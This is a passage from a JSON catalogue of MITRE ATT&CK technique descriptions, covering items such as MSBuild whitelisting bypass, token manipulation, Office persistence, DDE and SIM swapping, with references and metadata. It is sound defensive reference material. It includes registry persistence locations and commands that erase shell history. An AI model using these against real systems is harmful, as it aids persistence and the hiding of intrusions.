      "description": "There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.\n\n### MSBuild\n\nMSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. (Citation: MSDN MSBuild) \n\nAdversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: LOLBAS Msbuild)\n\n### DNX\n\nThe .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. \n\nAn adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)\n\n### RCSI\n\nThe rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)\n\nC# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 RCSI Bypass)\n\n### WinDbg/CDB\n\nWinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities. (Citation: Exploit Monday WinDbg)\n\nIt is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.\n\n### Tracker\n\nThe file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs File Tracking)\n\nAn adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. (Citation: LOLBAS Tracker)",
      "meta": {
        "external_id": "T1127",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1127",
          "https://msdn.microsoft.com/library/dd393574.aspx",
          "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/",
          "https://docs.microsoft.com/en-us/dotnet/core/migration/from-dnx",
          "https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/",
          "https://blogs.msdn.microsoft.com/visualstudio/2011/10/19/introducing-the-microsoft-roslyn-ctp/",
          "https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/",
          "https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/index",
          "http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html",
          "https://docs.microsoft.com/visualstudio/msbuild/file-tracking",
          "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/"
        ]
      },
      "uuid": "ff25900d-76d5-449b-a351-8824e62fc81b",
      "value": "Trusted Developer Utilities - T1127"
    },
    {
      "description": "Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence)\n\nProof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon)",
      "meta": {
        "external_id": "T1128",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "DLL monitoring",
          "Windows Registry",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1128",
          "https://technet.microsoft.com/library/bb490939.aspx",
          "https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html",
          "https://github.com/outflankbv/NetshHelperBeacon"
        ]
      },
      "uuid": "bb0e0cb5-f3e4-4118-a4cb-6bf13bfbc9f2",
      "value": "Netsh Helper DLL - T1128"
    },
    {
      "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be whitelisted within a target environment. Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n\nRemote access tools may be established and used post-compromise as alternate communications channel for [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)",
      "meta": {
        "external_id": "T1219",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Network intrusion detection system",
          "Network protocol analysis",
          "Process use of network",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1219",
          "https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf",
          "https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf",
          "https://blog.crysys.hu/2013/03/teamspy/"
        ]
      },
      "uuid": "4061e78c-1284-44b4-9116-73e4ac3912f7",
      "value": "Remote Access Tools - T1219"
    },
    {
      "description": "Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1028) can also be used externally.\n\nAdversaries may use remote services to initially access and/or persist within a network. (Citation: Volexity Virtual Private Keylogging) Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of [Redundant Access](https://attack.mitre.org/techniques/T1108) during an operation.",
      "meta": {
        "external_id": "CAPEC-555",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "Authentication logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1133",
          "https://capec.mitre.org/data/definitions/555.html",
          "https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/"
        ]
      },
      "uuid": "10d51417-ee35-4589-b1ff-b6df1c334e8d",
      "value": "External Remote Services - T1133"
    },
    {
      "description": "Obfuscation is the act of creating communications that are more difficult to understand.  Encryption transforms the communications such that it requires a key to reverse the encryption. (Citation: FireEyeAPT28)",
      "meta": {
        "external_id": "T1313",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1313"
        ]
      },
      "uuid": "c2ffd229-11bb-4fd8-9208-edbe97b14c93",
      "value": "Obfuscation or cryptography - T1313"
    },
    {
      "description": "Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. For example, Microsoft promotes the use of access tokens as a security best practice. Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>.(Citation: Microsoft runas)\n  \nAdversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAccess tokens can be leveraged by adversaries through three methods:(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token Impersonation/Theft** - An adversary creates a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread. This is useful for when the target user has a non-network logon session on the system.\n\n**Create Process with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code> and uses it with <code>CreateProcessWithTokenW</code> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.\n\n**Make and Impersonate Token** - An adversary has a username and password but the user is not logged onto the system. The adversary can then create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation and uses token impersonation to escalate privileges.(Citation: Metasploit access token) The Cobalt Strike beacon payload allows arbitrary token impersonation and can also create tokens. (Citation: Cobalt Strike Access Token)",
      "meta": {
        "external_id": "CAPEC-633",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Access tokens",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1134",
          "https://capec.mitre.org/data/definitions/633.html",
          "https://technet.microsoft.com/en-us/library/bb490994.aspx",
          "https://pentestlab.blog/2017/04/03/token-manipulation/",
          "https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf",
          "https://www.offensive-security.com/metasploit-unleashed/fun-incognito/",
          "https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/",
          "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
          "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx",
          "https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx",
          "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx"
        ]
      },
      "uuid": "dcaa092b-7de9-4a21-977f-7fcb77e89c48",
      "value": "Access Token Manipulation - T1134"
    },
    {
      "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n\nAdversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)",
      "meta": {
        "external_id": "T1531",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Windows event logs",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1531",
          "https://www.carbonblack.com/2019/03/22/tau-threat-intelligence-notification-lockergoga-ransomware/",
          "https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/"
        ]
      },
      "uuid": "b24e2a20-3b3d-4bf0-823b-1ed765398fb0",
      "value": "Account Access Removal - T1531"
    },
    {
      "description": "Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\n### Windows\n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder)\n\n[Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.\n\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.\n\n### Mac\n\nOn Mac, locally mounted shares can be viewed with the <code>df -aH</code> command.\n\n### Cloud\n\nCloud virtual networks may contain remote network shares or file storage services accessible to an adversary after they have obtained access to a system. For example, AWS, GCP, and Azure support creation of Network File System (NFS) shares and Server Message Block (SMB) shares that may be mapped on endpoint or cloud-based systems.(Citation: Amazon Creating an NFS File Share)(Citation: Google File servers on Compute Engine)",
      "meta": {
        "external_id": "CAPEC-643",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "Network protocol analysis",
          "Process use of network"
        ],
        "mitre_platforms": [
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1135",
          "https://capec.mitre.org/data/definitions/643.html",
          "https://en.wikipedia.org/wiki/Shared_resource",
          "https://technet.microsoft.com/library/cc770880.aspx",
          "https://docs.aws.amazon.com/storagegateway/latest/userguide/CreatingAnNFSFileShare.html",
          "https://cloud.google.com/solutions/filers-on-compute-engine"
        ]
      },
      "uuid": "3489cfc5-640f-4bb3-a103-9137b97de79f",
      "value": "Network Share Discovery - T1135"
    },
    {
      "description": "Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.\n\n### Office Template Macros\n\nMicrosoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<code>C:\\Users\\\\(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<code>C:\\Users\\\\(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.\n\n### Office Test\n\nA Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started (Citation: Hexacorn Office Test)\n\n<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\n### Add-ins\n\nOffice add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins)\n\nAdd-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\n### Outlook Rules, Forms, and Home Page\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)\n\nOutlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)\n\nOutlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook Forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\nOutlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nTo abuse these features, an adversary requires prior access to the user’s Outlook mailbox, either via an Exchange/OWA server or via the client application. Once malicious rules, forms, or Home Pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded while malicious rules and forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)(Citation: SensePost Outlook Forms)(Citation: SensePost Outlook Home Page)",
      "meta": {
        "external_id": "T1137",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "Windows Registry",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Windows",
          "Office 365"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1137",
          "https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea",
          "https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office",
          "https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/",
          "http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/",
          "https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique",
          "http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/",
          "https://support.office.com/article/Add-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460",
          "https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/",
          "https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s03-youve-got-mail.pdf",
          "https://github.com/sensepost/ruler",
          "https://silentbreaksecurity.com/malicious-outlook-rules/",
          "https://sensepost.com/blog/2017/outlook-forms-and-shells/",
          "https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/",
          "https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746",
          "https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943",
          "https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack",
          "https://github.com/sensepost/notruler"
        ]
      },
      "uuid": "2c4d4e92-0ccf-4a97-b54c-86d662988a53",
      "value": "Office Application Startup - T1137"
    },
    {
      "description": "Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\n\nAdversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.",
      "meta": {
        "external_id": "T1173",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "DLL monitoring",
          "Process monitoring",
          "Windows Registry",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1173",
          "https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/",
          "https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021",
          "https://technet.microsoft.com/library/security/4053440",
          "https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/",
          "https://www.contextis.com/blog/comma-separated-vulnerabilities",
          "https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee",
          "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/",
          "https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/"
        ]
      },
      "uuid": "edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0",
      "value": "Dynamic Data Exchange - T1173"
    },
    {
      "description": "Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. (Citation: DellComfooMasters)",
      "meta": {
        "external_id": "T1318",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1318"
        ]
      },
      "uuid": "9d234df0-2344-4db4-bc0f-8de9c6c071a7",
      "value": "Obfuscate operational infrastructure - T1318"
    },
    {
      "description": "Adversaries may abuse Clipboard Manager APIs to obtain sensitive information copied to the global clipboard. For example, passwords being copy-and-pasted from a password manager app could be captured by another application installed on the device.(Citation: Fahl-Clipboard)\n\nOn Android, <code>ClipboardManager.OnPrimaryClipChangedListener</code> can be used by applications to register as a listener and monitor the clipboard for changes.(Citation: Github Capture Clipboard 2019)\n\nAndroid 10 mitigates this technique by preventing applications from accessing clipboard data unless the application is on the foreground or is set as the device’s default input method editor (IME).(Citation: Android 10 Privacy Changes)",
      "meta": {
        "external_id": "APP-35",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1414",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-35.html",
          "http://saschafahl.de/static/paper/pwmanagers2013.pdf",
          "https://github.com/grepx/android-clipboard-security",
          "https://developer.android.com/about/versions/10/privacy/changes#clipboard-data"
        ]
      },
      "uuid": "c4b96c0b-cb58-497a-a1c2-bb447d79d692",
      "value": "Capture Clipboard Data - T1414"
    },
    {
      "description": "An adversary could convince the mobile network operator (e.g. through social networking, forged identification, or insider attacks performed by trusted employees) to issue a new SIM card and associate it with an existing phone number and account (Citation: NYGov-Simswap) (Citation: Motherboard-Simswap2). The adversary could then obtain SMS messages or hijack phone calls intended for someone else (Citation: Betanews-Simswap). \n\nOne use case is intercepting authentication messages or phone calls to obtain illicit access to online banking or other online accounts, as many online services allow account password resets by sending an authentication code over SMS to a phone number associated with the account (Citation: Guardian-Simswap) (Citation: Motherboard-Simswap1)(Citation: Krebs-SimSwap)(Citation: TechCrunch-SimSwap).",
      "meta": {
        "external_id": "STA-22",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1451",
          "https://pages.nist.gov/mobile-threat-catalogue/stack-threats/STA-22.html",
          "http://www.dos.ny.gov/consumerprotection/scams/att-sim.html",
          "https://motherboard.vice.com/en_us/article/3ky5a5/criminals-recruit-telecom-employees-sim-swapping-port-out-scam",
          "http://betanews.com/2016/02/12/everything-you-need-to-know-about-sim-swap-scams/",
          "https://www.theguardian.com/money/2016/apr/16/sim-swap-fraud-mobile-banking-fraudsters",
          "https://motherboard.vice.com/en_us/article/vbqax3/hackers-sim-swapping-steal-phone-numbers-instagram-bitcoin",
          "https://krebsonsecurity.com/2018/05/t-mobile-employee-made-unauthorized-sim-swap-to-steal-instagram-account/",
          "https://techcrunch.com/2017/08/23/i-was-hacked/"
        ]
      },
      "uuid": "a64a820a-cb21-471f-920c-506a2ff04fa5",
      "value": "SIM Card Swap - T1451"
    },
    {
      "description": "An iOS application may be able to maliciously claim a URL scheme, allowing it to intercept calls that are meant for a different application(Citation: FireEye-Masque2)(Citation: Dhanjani-URLScheme). This technique, for example, could be used to capture OAuth authorization codes(Citation: IETF-PKCE) or to phish user credentials(Citation: MobileIron-XARA).",
      "meta": {
        "external_id": "AUT-10",
        "kill_chain": [
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1415",
          "https://pages.nist.gov/mobile-threat-catalogue/authentication-threats/AUT-10.html",
          "https://www.fireeye.com/blog/threat-research/2015/02/ios_masque_attackre.html",
          "http://www.dhanjani.com/blog/2010/11/insecure-handling-of-url-schemes-in-apples-ios.html",
          "https://tools.ietf.org/html/rfc7636",
          "https://www.mobileiron.com/en/smartwork-blog/ios-url-scheme-hijacking-xara-attack-analysis-and-countermeasures"
        ]
      },
      "uuid": "8f142a25-f6c3-4520-bd50-2ae3ab50ed3e",
      "value": "URL Scheme Hijacking - T1415"
    },
    {
      "description": "A malicious app can register to receive intents meant for other applications and may then be able to receive sensitive values such as OAuth authorization codes(Citation: IETF-PKCE).",
      "meta": {
        "external_id": "T1416",
        "kill_chain": [
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1416",
          "https://tools.ietf.org/html/rfc7636"
        ]
      },
      "uuid": "77e30eee-fd48-40b4-99ec-73e97c158b58",
      "value": "Android Intent Hijacking - T1416"
    },
    {
      "description": "macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>.",
      "meta": {
        "external_id": "T1146",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1146"
        ]
      },
      "uuid": "d3046a90-580c-4004-8208-66915bc29830",
      "value": "Clear Command History - T1146"
    },
    {
      "description": "Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.\n\nBefore registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.\n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)",
      "meta": {
        "external_id": "T1174",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "DLL monitoring",
          "Process monitoring",
          "Windows Registry"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1174",
          "http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html",
          "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/"
        ]
      },
      "uuid": "b8c5c9dd-a662-479d-9428-ae745872537c",
      "value": "Password Filter DLL - T1174"
    },
    {
      "description": "On Android, device type information is accessible to apps through the android.os.Build class (Citation: Android-Build). Device information could be used to target privilege escalation exploits.",
      "meta": {
        "external_id": "T1419",
        "refs": [
          "https://attack.mitre.org/techniques/T1419",
          "https://developer.android.com/reference/android/os/Build"
        ]
      },
      "related": [
        {
          "dest-uuid": "e2ea7f6b-8d4f-49c3-819d-660530d12b77",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "89fcd02f-62dc-40b9-a54b-9ac4b1baef05",
      "value": "Device Type Discovery - T1419"
    },
    {
